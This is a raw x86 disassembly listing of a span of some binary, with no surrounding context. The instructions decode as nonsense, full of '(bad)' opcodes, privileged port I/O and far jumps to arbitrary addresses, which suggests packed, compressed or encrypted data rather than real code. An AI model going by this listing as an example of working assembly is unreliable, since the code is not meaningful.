  41bdc4:	mov    edx,0xed97acd8
  41bdc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdca:	(bad)  
  41bdcb:	and    eax,0x76c58cfb
  41bdd0:	pop    eax
  41bdd1:	mov    DWORD PTR [edi],eax
  41bdd3:	mov    BYTE PTR [ebp+0x6f9114a],cl
  41bdd9:	adc    ecx,DWORD PTR ds:0x7f5ebee6
  41bddf:	mov    bh,BYTE PTR [esi-0x610ec41e]
  41bde5:	shr    DWORD PTR [esi-0xb44285f],1
  41bdeb:	(bad)  [eax+ecx*4]
  41bdee:	jns    0x41be38
  41bdf0:	and    eax,esp
  41bdf2:	add    al,0x86
  41bdf4:	jno    0x41bdea
  41bdf6:	cmp    BYTE PTR gs:0x56192973,0x62
  41bdfe:	add    DWORD PTR [edx-0x1b6ff9fd],esp
  41be04:	mov    ah,BYTE PTR [ebx]
  41be06:	push   edi
  41be07:	cmp    edi,edx
  41be09:	jl     0x41bddf
  41be0b:	out    dx,eax
  41be0c:	lods   al,BYTE PTR ds:[esi]
  41be0d:	out    0x48,al
  41be0f:	ror    BYTE PTR [ebp-0x16fcc094],1
  41be15:	bound  ecx,QWORD PTR [esi+0x11b7d1c2]
  41be1b:	inc    esi
  41be1c:	fldenv [ebx-0x7d306818]
  41be22:	sbb    eax,0xfeff779c
  41be27:	pushf  
  41be28:	pop    edi
  41be29:	pop    ebp
  41be2a:	sub    BYTE PTR es:[ecx+0x49],0x3a
  41be2f:	lods   eax,DWORD PTR ds:[esi]
  41be30:	mov    edi,0x4448b710
  41be35:	or     BYTE PTR [edx-0x35191542],0x57
  41be3c:	adc    bh,ch
  41be3e:	cmp    BYTE PTR [edx+0x4a],bl
  41be41:	push   ebx
  41be42:	push   ebp
  41be43:	push   ecx
  41be44:	repnz inc edx
  41be46:	jecxz  0x41bddb
  41be48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be49:	sub    al,0x69
  41be4b:	add    al,0xc3
  41be4d:	ror    BYTE PTR [ebx+0xb],cl
  41be50:	mov    eax,edi
  41be52:	addr16 loop 0x41be27
  41be55:	and    ecx,ebx
  41be57:	mov    dl,0x8c
  41be59:	add    DWORD PTR [edi-0x37],esp
  41be5c:	add    edi,ebp
  41be5e:	inc    eax
  41be5f:	je     0x41bdfc
  41be61:	data16 xor BYTE PTR [ebp-0x5159a39f],ah
  41be68:	stc    
  41be69:	and    eax,0x4178416
  41be6e:	pop    ds
  41be6f:	cmp    al,0x43
  41be71:	ficom  DWORD PTR [edx]
  41be73:	fwait
  41be74:	pop    eax
  41be75:	jnp    0x41be38
  41be77:	imul   esp,DWORD PTR [esi+0x6ed61386],0x9d93e092
  41be81:	fs lock pop edx
  41be84:	or     ch,BYTE PTR [ebp+0x72]
  41be87:	int3   
  41be88:	sub    al,0xe4
  41be8a:	mov    edx,0xca1d7749
  41be8f:	je     0x41becd
  41be91:	int    0x0
  41be93:	dec    esi
  41be94:	push   ebp
  41be96:	icebp  
  41be97:	jb     0x41be64
  41be99:	cmp    dh,dl
  41be9b:	fist   DWORD PTR [eax-0x1a1376b4]
  41bea1:	fistp  DWORD PTR [edx]
  41bea3:	pop    edx
  41bea4:	pop    ss
  41bea5:	push   ebx
  41bea6:	inc    eax
  41bea7:	mov    DWORD PTR [esi-0x2cce051b],0xc72e6024
  41beb1:	pop    eax
  41beb2:	xor    eax,0x6f5c89d7
  41beb7:	pop    edi
  41beb8:	cdq    
  41beb9:	data16 shl BYTE PTR [esi+0x4ef06e21],0x22
  41bec1:	jno    0x41bea7
  41bec3:	mov    eax,0x68379cc2
  41bec8:	(bad)  
  41bec9:	pop    ss
  41beca:	fild   WORD PTR [edi+0x2e1aeb52]
  41bed0:	pop    ds
  41bed1:	add    al,BYTE PTR [ecx-0x8]
  41bed4:	cmp    al,0x4e
  41bed6:	mov    ecx,0xdfea4d7a
  41bedb:	loop   0x41bf1a
  41bedd:	push   ss
  41bede:	dec    ebp
  41bedf:	jmp    0x41be79
  41bee1:	outs   dx,BYTE PTR ds:[esi]
  41bee2:	inc    ebp
  41bee3:	mov    ebp,0x518aa208
  41bee8:	dec    edi
  41bee9:	or     BYTE PTR [edi],0xa1
  41beec:	jmp    0x98d3e3f0
  41bef1:	mov    esi,0x8c3353bd
  41bef6:	mov    edi,0x99bf1b9a
  41befb:	mov    bl,0x22
  41befd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41befe:	inc    edi
  41beff:	adc    DWORD PTR [ebp-0x2a],esp
  41bf02:	add    al,0x47
  41bf04:	(bad)  
  41bf06:	jmp    0xdd0a:0xecf367bc
  41bf0d:	dec    ebp
  41bf0e:	pushf  
  41bf0f:	mov    DWORD PTR [esi],eax
  41bf11:	lods   al,BYTE PTR ds:[esi]
  41bf12:	dec    ecx
  41bf13:	add    DWORD PTR [eax+0x251eb17],0xb6833dce
  41bf1d:	cmp    DWORD PTR [edi+0x53],eax
  41bf20:	cld    
  41bf21:	adc    cl,BYTE PTR [ecx+edx*2]
  41bf24:	lahf   
  41bf25:	setns  BYTE PTR [ecx+0x70]
  41bf29:	call   0x9007:0xeb1ee6be
  41bf30:	push   ss
  41bf31:	mov    bh,0x34
  41bf33:	adc    eax,0xe7f3b080
  41bf38:	sbb    BYTE PTR [ebx+edi*1-0x77],dl
  41bf3c:	jmp    0x41bf51
  41bf3e:	dec    esi
  41bf3f:	add    al,0x28
  41bf41:	loope  0x41bf3d
  41bf43:	in     al,0x7c
  41bf45:	lds    ecx,FWORD PTR [ebx+0x68c0bfc4]
  41bf4b:	inc    eax
  41bf4c:	pop    edi
  41bf4d:	mov    edx,0x3bb013e7
  41bf52:	pop    edx
  41bf53:	inc    esi
  41bf54:	mov    ebx,0x228969dc
  41bf59:	cs push 0xb95de6aa
  41bf5f:	sub    DWORD PTR ds:0xb72d2c5f,esp
  41bf66:	stos   DWORD PTR es:[edi],eax
  41bf67:	lea    ebp,[edx+0x5f]
  41bf6a:	stos   DWORD PTR es:[edi],eax
  41bf6b:	sbb    al,0xd7
  41bf6d:	xor    DWORD PTR [ebp+0x71],ebp
  41bf70:	sub    eax,0xb3f8b297
  41bf75:	jmp    0x41bf94
  41bf77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf78:	das    
  41bf79:	mov    bl,0xb6
  41bf7b:	(bad)  
  41bf7c:	gs jno 0x41bfb8
  41bf7f:	jnp    0x41bf97
  41bf81:	mov    ecx,0xed95ae1e
  41bf86:	or     cl,dl
  41bf88:	enter  0xc0d4,0xff
  41bf8c:	sbb    cl,BYTE PTR [ebp+ebx*2-0x4b]
  41bf90:	and    dl,BYTE PTR [eax-0x2b]
  41bf93:	sbb    edx,DWORD PTR [edi+ebp*1]
  41bf96:	ret    0xba35
  41bf99:	outs   dx,DWORD PTR ds:[esi]
  41bf9a:	jae    0x41bf3a
  41bf9c:	je     0x41bf63
  41bf9e:	test   BYTE PTR [esi+0x3d74b93f],dh
  41bfa4:	push   ds
  41bfa5:	out    dx,al
  41bfa6:	mov    BYTE PTR [ebx-0x5f],al
  41bfa9:	dec    eax
  41bfaa:	ins    DWORD PTR es:[edi],dx
  41bfab:	fdiv   DWORD PTR [edi+0x38e64e54]
  41bfb1:	fcmove st,st(2)
  41bfb3:	popa   
  41bfb4:	jne    0x41c004
  41bfb6:	dec    ecx
  41bfb7:	xchg   ecx,eax
  41bfb8:	js     0x41c028
  41bfba:	fucomip st,st(4)
  41bfbc:	data16 icebp 
  41bfbe:	je     0x41bfed
  41bfc0:	cmp    esi,ebx
  41bfc2:	push   cs
  41bfc3:	(bad)  
  41bfc4:	sahf   
  41bfc5:	push   ebx
  41bfc6:	lahf   
  41bfc7:	nop
  41bfc8:	and    DWORD PTR [edi+0x1126a96],ebp
  41bfce:	adc    eax,0xb2e568f4
  41bfd3:	xchg   esi,eax
  41bfd4:	popa   
  41bfd5:	mov    dl,cl
  41bfd7:	xor    dh,cl
  41bfd9:	mov    es,WORD PTR [ebx+0x2cc02af]
  41bfdf:	sbb    BYTE PTR [edi],0x50
  41bfe2:	test   BYTE PTR [esi-0x59],bl
  41bfe5:	mov    dl,BYTE PTR [esi]
  41bfe7:	sub    dh,BYTE PTR [ebp+0x4353be56]
  41bfed:	fdivr  DWORD PTR [ecx-0x163f724e]
  41bff3:	test   eax,0x2db288c1
  41bff8:	in     al,dx
  41bff9:	mov    eax,ds:0x4e703ce0
  41bffe:	shl    ebp,0x9e
  41c001:	inc    ecx
  41c002:	loopne 0x41c070
  41c004:	call   0xbc945006
  41c009:	lods   eax,DWORD PTR fs:[esi]
  41c00b:	ja     0x41bfdf
  41c00d:	mov    ebx,0x6071b8f0
  41c012:	push   0x2f0f2dc9
  41c017:	xor    al,0x66
  41c019:	jmp    0x502cfcd9
  41c01e:	xchg   DWORD PTR ds:0x1ca29451,esi
  41c024:	dec    cl
  41c026:	sbb    BYTE PTR [edx-0x6b97dae7],al
  41c02c:	loopne 0x41c011
  41c02e:	jg     0x41c009
  41c030:	pop    ds
  41c031:	add    eax,0x210d5df
  41c036:	sbb    eax,0xc20ebbdc
  41c03b:	sub    bh,bh
  41c03d:	adc    bl,dh
  41c03f:	mov    esi,0xe1f9635a
  41c044:	popf   
  41c045:	xchg   ecx,eax
  41c046:	xchg   BYTE PTR [eax-0x57],ah
  41c049:	sub    eax,0xd549aaee
  41c04e:	ret    0x3b42
  41c051:	div    esp
  41c053:	imul   edx,ebx,0xffffffdc
  41c056:	into   
  41c057:	pop    ebp
  41c058:	cmp    ch,bh
  41c05a:	jmp    FWORD PTR [edi+ebx*1-0x14ee0412]
  41c061:	inc    eax
  41c062:	xor    al,0xd0
  41c064:	inc    ebx
  41c065:	int3   
  41c066:	jg     0x41c000
  41c068:	add    DWORD PTR [ebp+0x63],0xffffffa2
  41c06c:	retf   0xfd91
  41c06f:	dec    eax
  41c070:	arpl   WORD PTR fs:[ebp-0x796849b0],cx
  41c077:	jb     0x41c0b4
  41c079:	int3   
  41c07a:	or     eax,DWORD PTR [edx]
  41c07c:	sub    ah,BYTE PTR [edx-0x1d48e241]
  41c082:	cmp    al,BYTE PTR [ecx+ebp*4-0x75]
  41c086:	fld    DWORD PTR [eax-0x20]
  41c089:	or     ch,BYTE PTR [esi+0x4846ca1f]
  41c08f:	call   0x946137f3
  41c094:	pusha  
  41c095:	shl    ah,1
  41c097:	mov    bl,0xe2
  41c099:	jae    0x41c0d0
  41c09b:	and    esi,ebx
  41c09d:	js     0x41c0c7
  41c09f:	int    0xc8
  41c0a1:	cmp    DWORD PTR [ebx],0x3
  41c0a4:	xor    ah,BYTE PTR [ecx+esi*2-0x51]
  41c0a8:	sar    DWORD PTR [ebp+0x4d4cca8a],cl
  41c0ae:	add    eax,esi
  41c0b0:	or     edx,DWORD PTR [eax+ebp*1+0x5d94bf18]
  41c0b7:	std    
  41c0b8:	bound  eax,QWORD PTR [edi-0x67ab1a8b]
  41c0be:	cmp    eax,0x4517e94e
  41c0c3:	mov    ecx,0xbef19fb1
  41c0c8:	push   ss
  41c0c9:	cmp    ah,BYTE PTR [edx+0x4dc4a7cf]
  41c0cf:	cld    
  41c0d0:	cmp    eax,0x4c196835
  41c0d5:	outs   dx,BYTE PTR ds:[esi]
  41c0d6:	mov    ah,0x7e
  41c0d8:	lea    ebp,ds:0x74a33b6a
  41c0de:	aam    0x8
  41c0e0:	xchg   ebx,eax
  41c0e1:	xchg   ebx,eax
  41c0e2:	ss adc al,bl
  41c0e5:	mov    bh,0x44
  41c0e7:	nop
  41c0e8:	mov    WORD PTR [esi],gs
  41c0ea:	mov    eax,0xb2571096
  41c0ef:	push   0xd08a62cd
  41c0f4:	call   0x652b:0x67b52b4b
  41c0fb:	sti    
  41c0fc:	es xor al,0x7c
  41c0ff:	loopne 0x41c0c9
  41c101:	je     0x41c0ac
  41c103:	test   eax,0x7f29fa90
  41c108:	int    0x35
  41c10a:	adc    DWORD PTR [esi-0x39],esi
  41c10d:	cmp    ch,BYTE PTR [ebx-0xe]
  41c110:	xchg   edx,eax
  41c111:	adc    DWORD PTR [ebp-0x53],0x59903f61
  41c118:	cmc    
  41c119:	js     0x41c130
  41c11b:	fdivr  QWORD PTR ds:0xeeccf317
  41c121:	outs   dx,DWORD PTR ds:[esi]
  41c122:	adc    al,0x5e
  41c124:	dec    ebp
  41c125:	xchg   ecx,eax
  41c126:	stos   DWORD PTR es:[edi],eax
  41c127:	jge    0x41c0c1
  41c129:	dec    ebx
  41c12a:	(bad)  
  41c12c:	adc    al,0xa3
  41c12e:	sbb    eax,0xa6b5faae
  41c133:	icebp  
  41c134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c135:	dec    ebp
  41c136:	fbld   TBYTE PTR [ebp-0x68]
  41c139:	enterw 0xe351,0x3f
  41c13e:	inc    edx
  41c13f:	scas   eax,DWORD PTR es:[edi]
  41c140:	mov    edi,0xbeae6fb
  41c145:	push   ebp
  41c146:	sub    ebp,ecx
  41c148:	mov    ah,0x82
  41c14a:	cmp    edi,DWORD PTR [ebp-0x3ae31e20]
  41c150:	out    0x80,eax
  41c152:	hlt    
  41c153:	leave  
  41c154:	retf   0xddde
  41c157:	test   BYTE PTR [edi],bl
  41c159:	bound  ebx,QWORD PTR [ebx+ebx*8]
  41c15c:	and    ch,BYTE PTR [ecx+0x2e]
  41c15f:	pusha  
  41c160:	hlt    
  41c161:	scas   eax,DWORD PTR es:[edi]
  41c162:	or     eax,0x6a4a65fc
  41c167:	(bad)  
  41c168:	push   esp
  41c169:	and    edx,DWORD PTR [ebx+0x9]
  41c16c:	xor    DWORD PTR ds:0x320c859f,esp
  41c172:	push   esp
  41c173:	sbb    BYTE PTR [esi],0x61
  41c176:	sbb    BYTE PTR [edx],dl
  41c178:	aas    
  41c179:	mov    edi,0x5ecf476c
  41c17e:	in     al,0x7f
  41c180:	pop    ebp
  41c181:	push   0x54
  41c183:	xlat   BYTE PTR ds:[ebx]
  41c184:	ja     0x41c15a
  41c186:	mov    ebp,0x9cc3fb86
  41c18b:	jne    0x41c186
  41c18d:	push   0x4f
  41c18f:	call   0xb5426f2f
  41c194:	push   ebx
  41c195:	out    0xc0,al
  41c197:	add    eax,0x95445144
  41c19c:	jecxz  0x41c1f1
  41c19e:	in     al,dx
  41c19f:	jmp    0x41c220
  41c1a1:	jge    0x41c152
  41c1a3:	shr    BYTE PTR [ebp+0x1fb15959],0xa9
  41c1aa:	mov    edx,0x6f9399b9
  41c1af:	retf   
  41c1b0:	div    DWORD PTR [edx+0x50]
  41c1b3:	sbb    edi,ebp
  41c1b5:	sub    dl,cl
  41c1b7:	popf   
  41c1b8:	inc    esp
  41c1ba:	cwde   
  41c1bb:	fistp  WORD PTR [eax-0x46fd1ecd]
  41c1c1:	ret    0xeb65
  41c1c4:	add    esi,DWORD PTR [ecx]
  41c1c6:	inc    edi
  41c1c7:	pushf  
  41c1c8:	and    eax,0x1af0fbd5
  41c1cd:	dec    ebx
  41c1ce:	mov    WORD PTR [edi-0x3a],fs
  41c1d1:	stos   BYTE PTR es:[edi],al
  41c1d2:	fstp   DWORD PTR [ecx+0x4a]
  41c1d5:	retf   0xb71b
  41c1d8:	and    eax,0x7fba9e0e
  41c1dd:	dec    eax
  41c1de:	push   esp
  41c1df:	mov    esp,0xa67eaf88
  41c1e4:	pop    edx
  41c1e5:	(bad)  
  41c1e6:	retf   0xb1b9
  41c1e9:	stos   DWORD PTR es:[edi],eax
  41c1ea:	jge    0x41c19f
  41c1ec:	ja     0x41c253
  41c1ee:	out    dx,al
  41c1ef:	or     bl,BYTE PTR [edi-0x32]
  41c1f2:	add    al,ch
  41c1f4:	and    ebp,edi
  41c1f6:	fwait
  41c1f7:	adc    ch,BYTE PTR [ebp+edx*2-0x54]
  41c1fb:	cli    
  41c1fc:	(bad)  
  41c1fd:	adc    ch,BYTE PTR [ebp+ebp*4+0x19afcc7]
  41c204:	xchg   BYTE PTR [ebp-0x3fd4420d],al
  41c20a:	pop    ebp
  41c20b:	sub    al,0x8
  41c20d:	pop    esp
  41c20e:	mov    dl,0x9b
  41c210:	xor    DWORD PTR [edx+0x28668608],esi
  41c216:	cdq    
  41c217:	ins    BYTE PTR es:[edi],dx
  41c218:	test   eax,0xb3c0a570
  41c21d:	hlt    
  41c21e:	sti    
  41c21f:	retf   0x51e7
  41c222:	enter  0x6800,0x6e
  41c226:	ror    DWORD PTR [eax+0x1c],0xae
  41c22a:	lods   eax,DWORD PTR ds:[esi]
  41c22b:	fimul  WORD PTR cs:[ebx-0x69de1ea1]
  41c232:	cmp    eax,0x3b29c50e
  41c237:	addr16 or bh,0xdd
  41c23b:	mov    bl,0xe1
  41c23d:	mov    al,ds:0xd05bdb26
  41c242:	dec    ebx
  41c243:	mov    al,ds:0x9ad75230
  41c248:	(bad)  
  41c24a:	push   0xffffff9a
  41c24c:	loopne 0x41c21e
  41c24e:	fadd   DWORD PTR [esi+0x2a9261fd]
  41c254:	(bad)  
  41c255:	into   
  41c256:	sbb    ecx,0x13c53348
  41c25c:	call   0xb1d1e634
  41c261:	xchg   edx,eax
  41c262:	stc    
  41c263:	push   es
  41c264:	jge    0x41c236
  41c266:	inc    ecx
  41c267:	inc    eax
  41c268:	(bad)  
  41c269:	clc    
  41c26a:	pop    esi
  41c26b:	add    eax,0x6b67a223
  41c270:	and    edi,ecx
  41c272:	out    0x62,al
  41c274:	arpl   cx,bp
  41c276:	mov    DWORD PTR [edx],ebx
  41c278:	cmp    al,BYTE PTR [edx-0x6b]
  41c27b:	and    DWORD PTR [ecx+0x15],edx
  41c27e:	test   bh,bh
  41c280:	outs   dx,BYTE PTR ds:[esi]
  41c281:	jecxz  0x41c302
  41c283:	cmp    bh,BYTE PTR [ebx+0x28]
  41c286:	and    al,0xf
  41c288:	xor    DWORD PTR [esi],eax
  41c28a:	lods   eax,DWORD PTR ds:[esi]
  41c28b:	jb     0x41c263
  41c28d:	int    0x3c
  41c28f:	loope  0x41c289
  41c291:	dec    edx
  41c292:	fmul   DWORD PTR ss:[edi]
  41c295:	mov    dh,0x67
  41c297:	push   edi
  41c298:	nop
  41c299:	sbb    eax,0xb0837cb5
  41c29e:	push   eax
  41c29f:	or     ebp,eax
  41c2a1:	test   al,0x3c
  41c2a3:	push   0x2ef86ce6
  41c2a8:	ror    DWORD PTR [ebx-0x37325c70],cl
  41c2ae:	and    DWORD PTR [edi+0x46cdd6db],0x97c0a661
  41c2b8:	cmp    BYTE PTR [ebx],0xa5
  41c2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2bc:	xor    al,0x19
  41c2be:	mov    ebp,DWORD PTR [ecx]
  41c2c0:	inc    ebp
  41c2c1:	lods   eax,DWORD PTR ds:[esi]
  41c2c2:	scas   eax,DWORD PTR es:[edi]
  41c2c3:	xchg   DWORD PTR [edi],eax
  41c2c5:	test   BYTE PTR [ebx+0x50],bl
  41c2c8:	pop    ecx
  41c2c9:	inc    esi
  41c2ca:	out    dx,eax
  41c2cb:	mov    esi,DWORD PTR [edx-0x3]
  41c2ce:	dec    eax
  41c2cf:	cdq    
  41c2d0:	rol    BYTE PTR [edi],0x14
  41c2d3:	mov    bh,0x92
  41c2d5:	dec    edx
  41c2d6:	aas    
  41c2d7:	jne    0x41c2e6
  41c2d9:	iret   
  41c2da:	popf   
  41c2db:	cmp    cl,BYTE PTR [edi+0x15]
  41c2de:	fs repnz dec edi
  41c2e1:	xchg   edx,eax
  41c2e2:	scas   al,BYTE PTR es:[edi]
  41c2e3:	mov    ?,WORD PTR [eax-0x2d]
  41c2e6:	mov    dl,0x2d
  41c2e8:	dec    ebx
  41c2e9:	xor    DWORD PTR [ebx+0x34],edx
  41c2ec:	(bad)  
  41c2ed:	repz adc ch,bh
  41c2f0:	xlat   BYTE PTR ds:[ebx]
  41c2f1:	jnp    0x41c2ec
  41c2f3:	jno    0x41c31a
  41c2f5:	rcr    BYTE PTR [eax+0x56],0xd5
  41c2f9:	and    DWORD PTR [eax-0x80],esp
  41c2fc:	lods   al,BYTE PTR ds:[esi]
  41c2fd:	and    ebx,DWORD PTR [edx+edx*1-0x59]
  41c301:	pop    esp
  41c302:	mov    dl,ch
  41c304:	and    eax,eax
  41c306:	and    al,0x72
  41c308:	pushf  
  41c309:	lea    edx,[esi-0x79]
  41c30c:	cli    
  41c30d:	mov    esp,0xc9d07078
  41c312:	gs pop ebx
  41c314:	lahf   
  41c315:	loop   0x41c298
  41c317:	call   FWORD PTR [ebx+edx*2+0x6b98cd4c]
  41c31e:	xor    BYTE PTR [ebp+0x42],al
  41c321:	cmp    eax,0xf4e8e8bf
  41c326:	in     eax,dx
  41c327:	adc    BYTE PTR [esi+0x2],bl
  41c32a:	push   0x65
  41c32c:	pop    ss
  41c32d:	daa    
  41c32e:	xchg   ecx,eax
  41c32f:	std    
  41c330:	mov    dl,0xa0
  41c332:	sbb    bh,BYTE PTR [ebx-0x68]
  41c335:	sti    
  41c336:	pop    ebx
  41c337:	jno    0x41c2fc
  41c339:	or     BYTE PTR [ecx],bh
  41c33b:	mov    BYTE PTR [ebx],bh
  41c33d:	std    
  41c33e:	xor    DWORD PTR [edx+0x39],ebx
  41c341:	dec    esi
  41c342:	push   edi
  41c343:	mov    esi,0xfb00581b
  41c348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c349:	or     DWORD PTR [ebx],esi
  41c34b:	in     eax,dx
  41c34c:	retf   0x6c71
  41c34f:	mov    bh,0xc1
  41c351:	repz dec esi
  41c353:	sbb    edx,DWORD PTR [esi]
  41c355:	push   esi
  41c356:	(bad)  
  41c357:	out    dx,eax
  41c358:	out    0x35,eax
  41c35a:	sub    cl,BYTE PTR ds:0xfcda3a05
  41c360:	dec    eax
  41c361:	daa    
  41c362:	daa    
  41c363:	mov    eax,ds:0xf1d50f3f
  41c368:	icebp  
  41c369:	scas   al,BYTE PTR es:[edi]
  41c36a:	pop    ecx
  41c36b:	popf   
  41c36c:	ins    BYTE PTR es:[edi],dx
  41c36d:	or     DWORD PTR [ebx-0x40],ebx
  41c370:	popa   
  41c371:	arpl   WORD PTR [edi-0xe9e4f48],di
  41c377:	fild   QWORD PTR [eax+edx*4-0x1bb01b97]
  41c37e:	xchg   ebx,eax
  41c37f:	in     al,0x86
  41c381:	xor    eax,0xf717f4ea
  41c386:	js     0x41c329
  41c388:	sbb    edi,edi
  41c38a:	sar    esi,1
  41c38c:	les    eax,FWORD PTR [esi-0x764fe689]
  41c392:	sahf   
  41c393:	xor    dh,BYTE PTR [ecx-0xb]
  41c396:	and    BYTE PTR [ecx],0x15
  41c399:	je     0x41c377
  41c39b:	sub    al,0x40
  41c39d:	(bad)  
  41c39e:	mov    al,0xc8
  41c3a0:	fwait
  41c3a1:	popa   
  41c3a2:	pushf  
  41c3a3:	push   esi
  41c3a4:	push   edx
  41c3a5:	pop    eax
  41c3a6:	cmp    al,0xc6
  41c3a8:	(bad)  
  41c3a9:	ins    DWORD PTR es:[edi],dx
  41c3aa:	xor    BYTE PTR ds:0x7e4a5a46,bl
  41c3b0:	call   0xc469:0x38d9c855
  41c3b7:	or     ebp,DWORD PTR [edi-0x29]
  41c3ba:	xlat   BYTE PTR ds:[ebx]
  41c3bb:	scas   eax,DWORD PTR es:[edi]
  41c3bc:	cmp    al,ah
  41c3be:	retf   0x6abd
  41c3c1:	inc    esi
  41c3c2:	and    DWORD PTR [ebx-0x18],0xffffffa9
  41c3c6:	dec    ecx
  41c3c7:	mov    eax,ds:0x1e9989d4
  41c3cc:	xor    ecx,edx
  41c3ce:	mov    cs,WORD PTR [ecx-0x7b]
  41c3d1:	mov    ds:0x5c1a21a7,eax
  41c3d6:	scas   eax,DWORD PTR es:[edi]
  41c3d7:	stos   DWORD PTR es:[edi],eax
  41c3d8:	and    eax,0xac52c0ea
  41c3dd:	dec    ecx
  41c3de:	or     DWORD PTR [ecx*2+0x3207d830],esi
  41c3e5:	enter  0xc797,0x37
  41c3e9:	pop    edi
  41c3ea:	stos   DWORD PTR es:[edi],eax
  41c3eb:	into   
  41c3ec:	dec    esp
  41c3ed:	mov    esp,0x6614230b
  41c3f2:	push   cs
  41c3f3:	retf   0x34e0
  41c3f6:	stc    
  41c3f7:	rol    DWORD PTR [ebx+0x4],1
  41c3fa:	fisttp WORD PTR [ecx]
  41c3fc:	inc    ebp
  41c3fd:	sbb    eax,0x5edf17e
  41c402:	(bad)  
  41c403:	xor    BYTE PTR [esi-0x7ba33058],0x37
  41c40a:	out    0x3,eax
  41c40c:	pop    eax
  41c40d:	mov    edi,DWORD PTR [edx+0x6b96de7]
  41c413:	xchg   dl,ah
  41c415:	dec    edx
  41c416:	jns    0x41c3d4
  41c418:	cdq    
  41c419:	cmp    eax,0x31b41c33
  41c41e:	(bad)  
  41c41f:	mov    esp,0xeb27fb27
  41c424:	xor    al,0xb9
  41c426:	or     bl,bh
  41c428:	dec    ecx
  41c429:	pop    ss
  41c42a:	mov    cl,0xa7
  41c42c:	mov    ch,0x76
  41c42e:	int    0x8f
  41c430:	push   0xffffff94
  41c432:	inc    edx
  41c433:	jbe    0x41c465
  41c435:	push   eax
  41c436:	test   al,0x24
  41c438:	repnz pop edx
  41c43a:	adc    BYTE PTR [esi+0x4e],dh
  41c43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c43e:	jne    0x41c46f
  41c440:	xor    ebp,0x4c143fc9
  41c446:	add    DWORD PTR [esi+ecx*8+0x37e0f861],ecx
  41c44d:	or     eax,edi
  41c44f:	test   al,0xe4
  41c451:	push   esp
  41c452:	(bad)  
  41c454:	sbb    BYTE PTR [edi-0x45],0xfd
  41c458:	cmp    DWORD PTR [ecx],esp
  41c45a:	inc    ebp
  41c45b:	adc    BYTE PTR [edx+0x6941ea69],bl
  41c461:	mov    ah,0xc6
  41c463:	xchg   edx,eax
  41c464:	call   0x74690489
  41c469:	shl    DWORD PTR [edx+0x2f],cl
  41c46c:	xor    al,0xbe
  41c46e:	add    BYTE PTR [edi+esi*1+0x6d2d9335],bh
  41c475:	jne    0x41c45f
  41c477:	xor    al,0xaa
  41c479:	ds stc 
  41c47b:	jo     0x41c40b
  41c47d:	dec    eax
  41c47e:	add    BYTE PTR [edx+0x0],ch
  41c481:	jnp    0x41c454
  41c483:	sbb    dh,BYTE PTR [eax-0x7]
  41c486:	mov    WORD PTR [edi+0x7],ss
  41c489:	mov    ebx,0xf534308
  41c48e:	enter  0xeab7,0x27
  41c492:	outs   dx,BYTE PTR ds:[esi]
  41c493:	pop    ecx
  41c494:	xor    DWORD PTR [ebp-0x33a7a910],0x13d81fee
  41c49e:	xlat   BYTE PTR ds:[ebx]
  41c49f:	dec    edi
  41c4a0:	addr16 push 0x5d
  41c4a3:	add    ebx,DWORD PTR [ecx+0x15ef3c5a]
  41c4a9:	and    BYTE PTR [ebp+0x26],ah
  41c4ac:	and    al,0x9b
  41c4ae:	in     al,dx
  41c4af:	jl     0x41c461
  41c4b1:	popa   
  41c4b2:	fadd   QWORD PTR [esp+ebx*8+0x6ef01798]
  41c4b9:	idiv   cl
  41c4bb:	dec    ebx
  41c4bc:	out    0xd7,eax
  41c4be:	aam    0xa4
  41c4c0:	pop    ebx
  41c4c1:	or     BYTE PTR [esi+0x24ccc598],ah
  41c4c7:	div    bh
  41c4c9:	dec    ebp
  41c4ca:	pop    ss
  41c4cb:	push   0xfe3970fb
  41c4d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4d1:	push   ebx
  41c4d2:	dec    eax
  41c4d3:	cmp    edx,DWORD PTR [ecx+0x27]
  41c4d6:	push   eax
  41c4d7:	std    
  41c4d8:	or     eax,0xcecaf6d5
  41c4dd:	sbb    DWORD PTR [eax+0x29e2630d],ebx
  41c4e3:	out    dx,eax
  41c4e4:	jo     0x41c4d8
  41c4e6:	clc    
  41c4e7:	sub    eax,0xd32adf7c
  41c4ec:	jecxz  0x41c523
  41c4ee:	push   edi
  41c4ef:	scas   eax,DWORD PTR es:[edi]
  41c4f0:	dec    edi
  41c4f1:	xor    ebp,DWORD PTR [ebx-0x725921c2]
  41c4f7:	daa    
  41c4f8:	call   0xefaa406
  41c4fd:	pop    edx
  41c4fe:	push   cs
  41c4ff:	mov    eax,0xdc8efd80
  41c504:	or     al,0x8d
  41c506:	loop   0x41c525
  41c508:	add    eax,0xa6f13a01
  41c50d:	push   0xffffffd6
  41c50f:	push   esi
  41c510:	xchg   ecx,eax
  41c511:	sti    
  41c512:	sbb    ah,ah
  41c514:	inc    edx
  41c515:	xor    edx,edx
  41c517:	push   edx
  41c518:	mov    ah,0x38
  41c51a:	inc    edi
  41c51b:	les    ebx,FWORD PTR [esi+edx*8-0x6bf013ef]
  41c522:	mov    al,ds:0xe67259ef
  41c527:	cld    
  41c528:	je     0x41c59b
  41c52a:	jmp    0x41c550
  41c52c:	xor    eax,DWORD PTR [edx+0x6436f7a8]
  41c532:	inc    sp
  41c534:	dec    edi
  41c535:	jecxz  0x41c572
  41c537:	ret    0x3cd2
  41c53a:	jo     0x41c5aa
  41c53c:	aaa    
  41c53d:	mov    dh,bl
  41c53f:	xor    al,0x98
  41c541:	sbb    al,0xda
  41c543:	retf   
  41c544:	xchg   ebp,eax
  41c545:	xor    al,0x58
  41c547:	mov    eax,ds:0xfa7ae1c
  41c54c:	mov    dl,0x59
  41c54e:	inc    ebx
  41c54f:	mov    esi,0x1185fb4b
  41c554:	fist   DWORD PTR [ecx+0x6a]
  41c557:	test   al,0x22
  41c559:	jbe    0x41c5a5
  41c55b:	mov    al,ds:0xaef21706
  41c560:	jecxz  0x41c552
  41c562:	sbb    DWORD PTR [ecx+0x77670a3],0xffffffc5
  41c569:	xor    eax,0xe004cc99
